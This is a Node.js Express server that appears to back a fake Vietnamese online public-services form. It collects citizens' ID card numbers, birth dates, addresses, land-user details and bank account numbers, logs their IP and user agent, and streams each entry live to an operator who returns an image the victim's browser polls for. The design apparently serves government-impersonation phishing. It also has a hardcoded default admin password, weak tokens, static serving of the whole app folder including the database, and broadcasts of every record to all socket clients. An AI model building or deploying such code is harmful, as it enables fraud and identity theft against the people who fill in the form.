const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const Database = require('better-sqlite3');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const PORT = process.env.PORT || 3000;

const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'Admin123@!';

// Directories
const UPLOAD_DIR = path.join(__dirname, 'data', 'uploads');
fs.mkdirSync(UPLOAD_DIR, { recursive: true });

// Multer
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOAD_DIR),
  filename: (req, file, cb) => cb(null, req.params.id + '_' + Date.now() + path.extname(file.originalname))
});
const upload = multer({
  storage,
  limits: { fileSize: 10 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    if (/jpeg|jpg|png|gif|webp|bmp/.test(path.extname(file.originalname).toLowerCase())) cb(null, true);
    else cb(new Error('Chỉ cho phép upload ảnh'));
  }
});

// SQLite
const db = new Database(path.join(__dirname, 'data', 'dichvucong.db'));
db.pragma('journal_mode = WAL');

db.exec(`CREATE TABLE IF NOT EXISTS submissions (
  id TEXT PRIMARY KEY,
  don_vi_tiep_nhan TEXT, don_vi_ho_tro TEXT, linh_vuc TEXT,
  thu_tuc_hanh_chinh TEXT, dich_vu_cong TEXT, commitment INTEGER DEFAULT 0,
  ten_nguoi_nop TEXT, ngay_sinh_nguoi_nop TEXT, cmnd_nguoi_nop TEXT,
  ngay_cap_cmnd TEXT, noi_cap_cmnd TEXT,
  so_dien_thoai_nguoi_nop TEXT, dia_danh_hanh_chinh TEXT, dia_chi_chi_tiet TEXT,
  co_nguoi_uy_quyen INTEGER DEFAULT 0,
  ten_nguoi_uy_quyen TEXT, ngay_sinh_nguoi_uy_quyen TEXT, cmnd_nguoi_uy_quyen TEXT,
  ngay_cap_cmnd_uy_quyen TEXT, noi_cap_cmnd_uy_quyen TEXT,
  sdt_nguoi_uy_quyen TEXT, dia_chi_nguoi_uy_quyen TEXT,
  ten_nguoi_su_dung_dat TEXT, ngay_sinh_su_dung_dat TEXT, cmnd_su_dung_dat TEXT,
  ngay_cap_cmnd_su_dung_dat TEXT, noi_cap_cmnd_su_dung_dat TEXT,
  so_dien_thoai_su_dung_dat TEXT, dia_danh_hc_su_dung_dat TEXT, dia_chi_chi_tiet_su_dung_dat TEXT,
  ngan_hang TEXT, so_tai_khoan TEXT, chu_tai_khoan TEXT,
  image_path TEXT DEFAULT '', client_ip TEXT DEFAULT '', user_agent TEXT DEFAULT '',
  device_cleared INTEGER DEFAULT 0,
  status TEXT DEFAULT 'pending', note TEXT DEFAULT '',
  created_at TEXT, updated_at TEXT
)`);

// Migrations
try { db.exec('ALTER TABLE submissions ADD COLUMN image_path TEXT DEFAULT ""'); } catch(e) {}
try { db.exec('ALTER TABLE submissions ADD COLUMN client_ip TEXT DEFAULT ""'); } catch(e) {}
try { db.exec('ALTER TABLE submissions ADD COLUMN user_agent TEXT DEFAULT ""'); } catch(e) {}
try { db.exec('ALTER TABLE submissions ADD COLUMN device_cleared INTEGER DEFAULT 0'); } catch(e) {}

// Sessions
db.exec(`CREATE TABLE IF NOT EXISTS sessions (
  token TEXT PRIMARY KEY, username TEXT, created_at TEXT
)`);

// Middleware
app.set('trust proxy', true); // For Nginx reverse proxy (correct IP)
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  next();
});
app.use(express.static(__dirname, { extensions: ['html'], maxAge: '1h' }));

function generateToken() { return Math.random().toString(36).slice(2) + Date.now().toString(36); }
function requireAdmin(req, res, next) {
  const token = req.headers['x-admin-token'];
  if (!db.prepare('SELECT 1 FROM sessions WHERE token = ?').get(token)) return res.status(401).json({ error: 'Unauthorized' });
  next();
}

// Editable fields list
const EDITABLE_FIELDS = [
  'ten_nguoi_nop','ngay_sinh_nguoi_nop','cmnd_nguoi_nop','ngay_cap_cmnd','noi_cap_cmnd',
  'so_dien_thoai_nguoi_nop','dia_danh_hanh_chinh','dia_chi_chi_tiet',
  'don_vi_tiep_nhan','don_vi_ho_tro','linh_vuc','thu_tuc_hanh_chinh','dich_vu_cong',
  'ten_nguoi_su_dung_dat','ngay_sinh_su_dung_dat','cmnd_su_dung_dat',
  'ngay_cap_cmnd_su_dung_dat','noi_cap_cmnd_su_dung_dat',
  'so_dien_thoai_su_dung_dat','dia_danh_hc_su_dung_dat','dia_chi_chi_tiet_su_dung_dat',
  'ngan_hang','so_tai_khoan','chu_tai_khoan',
  'ten_nguoi_uy_quyen','ngay_sinh_nguoi_uy_quyen','cmnd_nguoi_uy_quyen',
  'ngay_cap_cmnd_uy_quyen','noi_cap_cmnd_uy_quyen','sdt_nguoi_uy_quyen','dia_chi_nguoi_uy_quyen',
  'status','note'
];

// ===== SUBMISSIONS API =====

// POST: User submits form
app.post('/api/submissions', (req, res) => {
  const id = 'HS-' + Date.now().toString().slice(-8);
  const now = new Date().toISOString();
  const d = req.body;
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  const userAgent = req.headers['user-agent'] || '';

  try {
    db.prepare(`INSERT INTO submissions (
      id, don_vi_tiep_nhan, don_vi_ho_tro, linh_vuc, thu_tuc_hanh_chinh, dich_vu_cong, commitment,
      ten_nguoi_nop, ngay_sinh_nguoi_nop, cmnd_nguoi_nop, ngay_cap_cmnd, noi_cap_cmnd,
      so_dien_thoai_nguoi_nop, dia_danh_hanh_chinh, dia_chi_chi_tiet,
      co_nguoi_uy_quyen, ten_nguoi_uy_quyen, ngay_sinh_nguoi_uy_quyen, cmnd_nguoi_uy_quyen,
      ngay_cap_cmnd_uy_quyen, noi_cap_cmnd_uy_quyen, sdt_nguoi_uy_quyen, dia_chi_nguoi_uy_quyen,
      ten_nguoi_su_dung_dat, ngay_sinh_su_dung_dat, cmnd_su_dung_dat, ngay_cap_cmnd_su_dung_dat,
      noi_cap_cmnd_su_dung_dat, so_dien_thoai_su_dung_dat, dia_danh_hc_su_dung_dat, dia_chi_chi_tiet_su_dung_dat,
      ngan_hang, so_tai_khoan, chu_tai_khoan,
      client_ip, user_agent, image_path, status, note, created_at, updated_at
    ) VALUES (?,?,?,?,?,?,?, ?,?,?,?,?, ?,?,?, ?,?,?,?, ?,?,?,?, ?,?,?,?, ?,?,?,?, ?,?,?, ?,?,'','pending','',?,?)
    `).run(
      id,
      d.don_vi_tiep_nhan||'', d.don_vi_ho_tro||'', d.linh_vuc||'',
      d.thu_tuc_hanh_chinh||'', d.dich_vu_cong||'', d.commitment?1:0,
      d.ten_nguoi_nop||'', d.ngay_sinh_nguoi_nop||'', d.cmnd_nguoi_nop||'',
      d.ngay_cap_cmnd||'', d.noi_cap_cmnd||'',
      d.so_dien_thoai_nguoi_nop||'', d.dia_danh_hanh_chinh||'', d.dia_chi_chi_tiet||'',
      d.co_nguoi_uy_quyen?1:0, d.ten_nguoi_uy_quyen||'', d.ngay_sinh_nguoi_uy_quyen||'',
      d.cmnd_nguoi_uy_quyen||'', d.ngay_cap_cmnd_uy_quyen||'', d.noi_cap_cmnd_uy_quyen||'',
      d.sdt_nguoi_uy_quyen||'', d.dia_chi_nguoi_uy_quyen||'',
      d.ten_nguoi_su_dung_dat||'', d.ngay_sinh_su_dung_dat||'', d.cmnd_su_dung_dat||'',
      d.ngay_cap_cmnd_su_dung_dat||'', d.noi_cap_cmnd_su_dung_dat||'',
      d.so_dien_thoai_su_dung_dat||'', d.dia_danh_hc_su_dung_dat||'', d.dia_chi_chi_tiet_su_dung_dat||'',
      d.ngan_hang||'', d.so_tai_khoan||'', d.chu_tai_khoan||'',
      clientIp, userAgent, now, now
    );
    console.log(`✓ Hồ sơ ${id} từ IP: ${clientIp}`);

    // Real-time notification to admin
    const newRow = db.prepare('SELECT * FROM submissions WHERE id = ?').get(id);
    io.emit('new_submission', newRow);

    res.json({ success: true, id });
  } catch (err) {
    console.error('Insert error:', err);
    res.status(500).json({ success: false, error: 'Lỗi lưu hồ sơ' });
  }
});

// GET: List with pagination (admin)
app.get('/api/submissions', requireAdmin, (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = parseInt(req.query.limit) || 10;
  const offset = (page - 1) * limit;
  const total = db.prepare('SELECT COUNT(*) as c FROM submissions').get().c;
  const rows = db.prepare('SELECT * FROM submissions ORDER BY created_at DESC LIMIT ? OFFSET ?').all(limit, offset);
  res.json({ data: rows, total, page, limit, totalPages: Math.ceil(total / limit) });
});

// GET: Stats (admin)
app.get('/api/submissions/stats', requireAdmin, (req, res) => {
  const total = db.prepare('SELECT COUNT(*) as c FROM submissions').get().c;
  const pending = db.prepare("SELECT COUNT(*) as c FROM submissions WHERE status='pending'").get().c;
  const approved = db.prepare("SELECT COUNT(*) as c FROM submissions WHERE status='approved'").get().c;
  const rejected = db.prepare("SELECT COUNT(*) as c FROM submissions WHERE status='rejected'").get().c;
  res.json({ total, pending, approved, rejected });
});

// GET: Single (admin)
app.get('/api/submissions/:id', requireAdmin, (req, res) => {
  const row = db.prepare('SELECT * FROM submissions WHERE id = ?').get(req.params.id);
  if (!row) return res.status(404).json({ error: 'Not found' });
  res.json(row);
});

// PUT: Update any editable field (admin)
app.put('/api/submissions/:id', requireAdmin, (req, res) => {
  const existing = db.prepare('SELECT * FROM submissions WHERE id = ?').get(req.params.id);
  if (!existing) return res.status(404).json({ error: 'Not found' });

  const updates = [];
  const values = [];
  for (const [key, val] of Object.entries(req.body)) {
    if (EDITABLE_FIELDS.includes(key)) {
      updates.push(`${key} = ?`);
      values.push(val);
    }
  }
  if (updates.length === 0) return res.json({ success: true, data: existing });

  updates.push('updated_at = ?');
  values.push(new Date().toISOString());
  values.push(req.params.id);

  db.prepare(`UPDATE submissions SET ${updates.join(', ')} WHERE id = ?`).run(...values);
  const updated = db.prepare('SELECT * FROM submissions WHERE id = ?').get(req.params.id);
  io.emit('submission_updated', updated);
  res.json({ success: true, data: updated });
});

// DELETE
app.delete('/api/submissions/:id', requireAdmin, (req, res) => {
  const row = db.prepare('SELECT image_path FROM submissions WHERE id = ?').get(req.params.id);
  if (row && row.image_path) {
    const p = path.join(__dirname, row.image_path);
    if (fs.existsSync(p)) fs.unlinkSync(p);
  }
  if (db.prepare('DELETE FROM submissions WHERE id = ?').run(req.params.id).changes === 0)
    return res.status(404).json({ error: 'Not found' });
  io.emit('submission_deleted', req.params.id);
  res.json({ success: true });
});

// IMAGE UPLOAD
app.post('/api/submissions/:id/upload', requireAdmin, (req, res) => {
  upload.single('image')(req, res, function(err) {
    if (err) return res.status(400).json({ error: 'Lỗi upload: ' + err.message });
    if (!req.file) return res.status(400).json({ error: 'Không có file ảnh' });
    const existing = db.prepare('SELECT * FROM submissions WHERE id = ?').get(req.params.id);
    if (!existing) return res.status(404).json({ error: 'Không tìm thấy' });
    if (existing.image_path) {
      const old = path.join(__dirname, existing.image_path);
      if (fs.existsSync(old)) fs.unlinkSync(old);
    }
    const rel = 'data/uploads/' + req.file.filename;
    db.prepare('UPDATE submissions SET image_path = ?, updated_at = ? WHERE id = ?')
      .run(rel, new Date().toISOString(), req.params.id);
    console.log(`✓ Upload: ${req.params.id} → ${req.file.filename}`);
    io.emit('submission_updated', db.prepare('SELECT * FROM submissions WHERE id = ?').get(req.params.id));
    res.json({ success: true, image_path: rel });
  });
});

// PUBLIC: Check device
app.get('/api/public/check-device', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  const ua = req.headers['user-agent'] || '';
  const row = db.prepare(
    'SELECT id, image_path, status FROM submissions WHERE client_ip = ? AND user_agent = ? AND device_cleared = 0 ORDER BY created_at DESC LIMIT 1'
  ).get(ip, ua);
  if (!row) return res.json({ found: false });
  res.json({ found: true, id: row.id, hasImage: !!row.image_path, image_url: row.image_path ? '/' + row.image_path : null, status: row.status });
});

// PUBLIC: Check image by ID
app.get('/api/public/submissions/:id/image', (req, res) => {
  const row = db.prepare('SELECT image_path, status FROM submissions WHERE id = ?').get(req.params.id);
  if (!row) return res.json({ hasImage: false, message: 'Không tìm thấy hồ sơ' });
  if (!row.image_path) return res.json({ hasImage: false, message: 'Hệ thống chưa nhận dữ liệu hồ sơ' });
  res.json({ hasImage: true, image_url: '/' + row.image_path, status: row.status });
});

// ADMIN: Clear device
app.post('/api/submissions/:id/clear-device', requireAdmin, (req, res) => {
  db.prepare('UPDATE submissions SET device_cleared = 1, updated_at = ? WHERE id = ?')
    .run(new Date().toISOString(), req.params.id);
  res.json({ success: true });
});

// AUTH
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const token = generateToken();
    db.prepare('INSERT INTO sessions (token, username, created_at) VALUES (?, ?, ?)').run(token, username, new Date().toISOString());
    res.json({ success: true, token });
  } else {
    res.status(401).json({ success: false, error: 'Sai tài khoản hoặc mật khẩu' });
  }
});

app.post('/api/admin/logout', (req, res) => {
  db.prepare('DELETE FROM sessions WHERE token = ?').run(req.headers['x-admin-token']);
  res.json({ success: true });
});

// Socket.IO
io.on('connection', (socket) => {
  console.log('📡 Client connected:', socket.id);
  socket.on('disconnect', () => {});
});

// Graceful shutdown
function shutdown() {
  console.log('\n🚫 Shutting down...');
  db.close();
  server.close(() => process.exit(0));
  setTimeout(() => process.exit(1), 5000);
}
process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);
process.on('uncaughtException', (err) => { console.error('Uncaught:', err); });
process.on('unhandledRejection', (err) => { console.error('Unhandled:', err); });

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🚀 Server: http://0.0.0.0:${PORT}`);
  console.log(`📋 Form: /dich-vu-cong-truc-tuyen`);
  console.log(`🔐 Admin: /admin/login`);
  console.log(`📡 Socket.IO: enabled`);
  console.log(`💾 DB: SQLite | WAL mode\n`);
});
